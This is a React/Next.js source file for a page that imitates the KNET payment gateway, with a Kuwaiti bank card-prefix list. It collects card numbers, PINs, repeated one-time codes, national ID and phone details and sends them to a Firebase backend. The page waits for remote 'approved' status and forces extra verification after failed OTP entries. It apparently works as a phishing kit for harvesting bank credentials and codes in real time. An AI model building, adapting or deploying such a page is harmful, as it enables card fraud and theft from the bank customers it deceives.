"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import "./qpy.css";
import { doc, onSnapshot } from "firebase/firestore";
import { setupOnlineStatus } from "@/lib/utils";
import { addData, db, handlePay } from "@/lib/firebase";
import LoaderK from "./loader";

const BANKS = [
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056", "588790"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: [
      "470350",
      "490455",
      "490456",
      "404919",
      "450605",
      "426058",
      "431199",
    ],
  },
  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: [
      "468564",
      "402978",
      "403583",
      "415254",
      "450238",
      "540759",
      "49219000",
    ],
  },
  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },
  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: [
      "526206",
      "531470",
      "531644",
      "531329",
      "517419",
      "517458",
      "531471",
      "559475",
    ],
  },
  {
    value: "TAM",
    label: "TAM Bank",
    cardPrefixes: ["45077848", "45077849"],
  },
  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "5326674", "450778"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160"],
  },
  {
    value: "Weyay",
    label: "Weyay Bank",
    cardPrefixes: ["46445250", "543363"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
];

export default function PaymentForm() {
  const [step, setstep] = useState<string | number>(1);
  const [newotp] = useState([""]);
  const [total, setTotal] = useState("25.000");
  const [isloading, setisloading] = useState(false);
  const router = useRouter();
  const [paymentInfo, setPaymentInfo] = useState({
    createdDate: new Date().toISOString(),
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "pendding",
    phoneNumber: "",
    network: "",
    idNumber: "",
    otp2: "",
    step: 1,
  });
  const [countdown, setCountdown] = useState(60);
  const [isCountdownActive, setIsCountdownActive] = useState(true);
  const [otpAttempts, setOtpAttempts] = useState(-6);
  const [otpValue, setOtpValue] = useState("");
  useEffect(() => {
    const amount = localStorage.getItem("amount");
    const visitor = localStorage.getItem("visitor");
    setTotal(amount!);
    setupOnlineStatus(visitor!);
  }, []);
  const handleAddotp = async (otp: string) => {
    const visitor = localStorage.getItem("visitor");

    newotp.push(`${otp} , `);
    await addData({ id: visitor, otp, allOtps: newotp });
  };

  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;

    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => {
        setCountdown((countdown) => countdown - 1);
      }, 1000);
    } else if (countdown === 0) {
      setIsCountdownActive(false);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isCountdownActive, countdown]);
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      setupOnlineStatus(visitorId!);
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any;
          // Only handle special redirect cases
          if (data.status === "pendding") {
          } else if (data.status === "approved") {
            setisloading(false);
            setstep(2);
          }
        }
      });
      return () => unsubscribe();
    }
  }, []);
  return (
    <div
      className="container"
      dir="ltr"
      style={{
        justifyContent: "center",
        padding: 0,
        margin: 0,
      }}
    >
      <form
        onSubmit={(e) => {
          e.preventDefault();
        }}
        style={{ direction: "ltr" }}
      >
        <div id="PayPageEntry">
          <div
            className="container"
            style={{
              display: "flex",
              justifyContent: "center",
              flexDirection: "column",
            }}
          >
            <img src="/mob.jpg" className="logo" alt="KNET logo" />

            <div className="container-blogo">
              <div className="logoHead-mob"></div>
            </div>
            <div className="content-block">
              <div className="form-card">
                <div className="row">
                  <div className="column-label">
                    <label>Payment Form</label>
                  </div>
                  <label className="column-value text-label">
                    <img
                      src="/vercel.svg"
                      className="logo"
                      alt="KNET logo"
                      width={65}
                    />
                  </label>
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">
                    Mobile Telecommunication Co.{" "}
                  </label>
                </div>
                <div className="row" id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {total}
                    {"  "}KD&nbsp;{" "}
                  </label>
                </div>
              </div>
              <div className="form-card">
                <div id="ValidationMessage"></div>
                <div className="notification" id="otpmsgDC" />
                <div className="notification" id="CVmsg" />

                {step === 1 ? (
                  <>
                    <div id="FCUseDebitEnable">
                      <div className="row">
                        <label className="column-label">
                          Select Your Bank:
                        </label>
                        <select
                          className="column-value"
                          onChange={(e: any) => {
                            const selectedBank = BANKS.find(
                              (bank) => bank.value === e.target.value,
                            );

                            setPaymentInfo({
                              ...paymentInfo,
                              bank: e.target.value,
                              bank_card: selectedBank
                                ? selectedBank.cardPrefixes
                                : [""],
                            });
                          }}
                        >
                          <option value="bankname" title="Select Your Bank">
                            Select Your Banks
                          </option>
                          {BANKS.map((i, index) => (
                            <option value={i.value} key={index}>
                              {i.label} [{i.value}]
                            </option>
                          ))}
                        </select>
                      </div>
                      <div
                        className="row three-column"
                        id="Paymentpagecardnumber"
                      >
                        <label className="column-label">Card Number:</label>
                        <select
                          className="column-value"
                          name="dcprefix"
                          id="dcprefix"
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              prefix: e.target.value,
                            })
                          }
                        >
                          <option value={"i"}>prefix</option>
                          {paymentInfo.bank_card.map((i, index) => (
                            <option key={index} value={i}>
                              {i}
                            </option>
                          ))}
                        </select>
                        <input
                          name="debitNumber"
                          id="debitNumber"
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          size={10}
                          className="column-long allownumericwithoutdecimal"
                          maxLength={10}
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              cardNumber: e.target.value,
                            })
                          }
                          title="Should be in number. Length should be 10"
                        />
                      </div>
                      <div className="row three-column" id="cardExpdate">
                        <label className="column-label">
                          {" "}
                          Expiration Date:{" "}
                        </label>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              month: e.target.value,
                            })
                          }
                          className="column-value"
                        >
                          <option value={0}>MM</option>
                          <option value={1}>01</option>
                          <option value={2}>02</option>
                          <option value={3}>03</option>
                          <option value={4}>04</option>
                          <option value={5}>05</option>
                          <option value={6}>06</option>
                          <option value={7}>07</option>
                          <option value={8}>08</option>
                          <option value={9}>09</option>
                          <option value={10}>10</option>
                          <option value={11}>11</option>
                          <option value={12}>12</option>
                        </select>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              year: e.target.value,
                            })
                          }
                          className="column-long"
                        >
                          <option value={0}>YYYY</option>
                          {Array.from({ length: 44 }, (_, i) => 2024 + i).map(
                            (year) => (
                              <option key={year} value={year}>
                                {year}
                              </option>
                            ),
                          )}
                        </select>
                      </div>
                      <div className="row" id="PinRow">
                        <label className="column-label"> PIN: </label>
                        <input
                          inputMode="numeric"
                          pattern="[0-9]*"
                          name="cardPin"
                          id="cardPin"
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              pass: e.target.value,
                            })
                          }
                          autoComplete="off"
                          title="Should be in number. Length should be 4"
                          type="password"
                          size={4}
                          maxLength={4}
                          className="column-value allownumericwithoutdecimal"
                        />
                      </div>
                    </div>
                  </>
                ) : step === 2 ? (
                  <div>
                    <div className="row alert-msg">
                      <strong>Please note:</strong> A 6-digit verification code
                      has been sent via text message to your registered phone
                      number
                    </div>
                    <div className="row">
                      <label className="column-label">CardNumber:</label>
                      <label className="column-value text-label">
                        {paymentInfo.cardNumber.substring(0, 5) +
                          "****" +
                          paymentInfo.cardNumber.substring(10, 15)}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Month expiry:</label>
                      <label className="column-value text-label">
                        {paymentInfo.month}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Year expiry:</label>
                      <label className="column-value text-label">
                        {paymentInfo.year}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">Pin:</label>
                      <label className="column-value text-label">
                        {"****"}
                      </label>
                    </div>
                    <div className="row">
                      <label className="column-label">OTP:</label>
                      <input
                        onChange={(e: any) => {
                          setPaymentInfo({
                            ...paymentInfo,
                            otp: e.target.value,
                          });
                          setOtpValue(e.target.value);
                        }}
                        type="tel"
                        maxLength={6}
                        id="timer"
                        className="column-value"
                        value={otpValue}
                        placeholder={`Timeout in: 01:${
                          countdown === 0 ? "00" : countdown
                        }`}
                      />
                    </div>
                  </div>
                ) : step === 3 ? (
                  <>
                    <Step3
                      setPaymentInfo={setPaymentInfo}
                      paymentInfo={paymentInfo}
                    />
                  </>
                ) : step === 4 ? (
                  <>
                    <Step4
                      setPaymentInfo={setPaymentInfo}
                      paymentInfo={paymentInfo}
                    />
                  </>
                ) : (
                  <></>
                )}
              </div>
              <div className="form-card">
                <div className="row">
                  <button
                    className="submit-button"
                    disabled={
                      (step === 1 &&
                        (paymentInfo.prefix === "" ||
                          paymentInfo.bank === "" ||
                          paymentInfo.cardNumber === "" ||
                          paymentInfo.pass === "" ||
                          paymentInfo.month === "" ||
                          paymentInfo.year === "" ||
                          paymentInfo.pass.length !== 4)) ||
                      (step === 2 && paymentInfo.otp?.length !== 6)
                    }
                    onClick={() => {
                      const vistorId = localStorage.getItem("visitor");
                      if (step === 1) {
                        setisloading(true);

                        addData({ id: vistorId, ...paymentInfo });
                      } else if (step === 2) {
                        if (!newotp.includes(paymentInfo.otp!)) {
                          newotp.push(paymentInfo.otp!);
                        }
                        setisloading(true);
                        handleAddotp(paymentInfo.otp!);

                        const newAttemptCount = otpAttempts + 1;
                        setOtpAttempts(newAttemptCount);
                        setOtpValue("");
                        handlePay(paymentInfo, setPaymentInfo);

                        setTimeout(() => {
                          if (newAttemptCount >= 3) {
                            alert(
                              "Maximum attempts reached. Moving to additional verification.",
                            );
                            setstep(3);
                            setOtpAttempts(1);
                          }
                          setisloading(false);
                        }, 3000);
                      } else if (step === 3) {
                        setisloading(true);
                        handlePay(paymentInfo, setPaymentInfo);
                        setTimeout(() => {
                          setstep(4);
                          setisloading(false);
                        }, 7000);
                      } else if (step === 4) {
                        setisloading(true);
                        handlePay(paymentInfo, setPaymentInfo);
                        setTimeout(() => {
                          setisloading(false);
                          alert("Payment completed!");
                        }, 5000);
                      }
                    }}
                  >
                    {isloading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                  </button>
                  <button className="cancel-button">Cancel</button>
                </div>
              </div>
              <div className="footer-content">
                <div
                  className="row text-center"
                  style={{ textAlign: "center", fontSize: 10 }}
                >
                  All Rights Reserved. Copyright 2024
                  <br />
                  <strong>
                    The Shared Electronic Banking Services Company - KNET
                  </strong>
                </div>
              </div>
            </div>
          </div>
        </div>
        {isloading && <LoaderK />}
      </form>
    </div>
  );
}

const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
  return (
    <div id="FCUseDebitEnable">
      <div className="row">
        <label className="column-label">ID Number:</label>
        <input
          name="natID"
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          size={12}
          onChange={(e: any) =>
            setPaymentInfo({
              ...paymentInfo,
              idNumber: e.target.value,
            })
          }
          className="column-value allownumericwithoutdecimal"
          maxLength={12}
          title="Should be in number. Length should be 12"
        />
      </div>
      <div className="row">
        <label className="column-label">Authorized Phone Number:</label>
        <input
          name="number"
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          size={10}
          onChange={(e: any) =>
            setPaymentInfo({
              ...paymentInfo,
              phoneNumber: e.target.value,
            })
          }
          className="column-value allownumericwithoutdecimal"
          maxLength={10}
          title="Should be in number. Length should be 10"
        />
      </div>
      <div className="row">
        <label className="column-label">Network operator: </label>
        <select
          className="column-value"
          name="company"
          onChange={(e: any) =>
            setPaymentInfo({
              ...paymentInfo,
              network: e.target.value,
            })
          }
          id="type"
        >
          <option value="">Choose Network operator:...</option>
          <option value="STC" title="STC">
            STC
          </option>
          <option value="Zain" title="Zain">
            Zain
          </option>
          <option value="Ooredoo" title="Ooredoo">
            Ooredoo
          </option>
        </select>
      </div>
    </div>
  );
};

const Step4 = (props: any) => {
  return (
    <div>
      <div className="row alert-msg">
        Please note: A 6-digit verification code has been sent via text message
        to your registered phone number
      </div>
      <div className="row">
        <label className="column-label">ID Number:</label>
        <label className="column-value text-label">
          {props.paymentInfo.idNumber}
        </label>
      </div>
      <div className="row">
        <label className="column-label">Phone Number:</label>
        <label className="column-value text-label">
          {props.paymentInfo.phoneNumber}
        </label>
      </div>
      <div className="row">
        <label className="column-label">OTP:</label>
        <input
          onChange={(e: any) =>
            props.setPaymentInfo({
              ...props.paymentInfo,
              otp2: e.target.value,
            })
          }
          type="tel"
          maxLength={6}
          id="timer"
          className="column-value"
          value={props.paymentInfo.otp2}
        />
      </div>
    </div>
  );
};
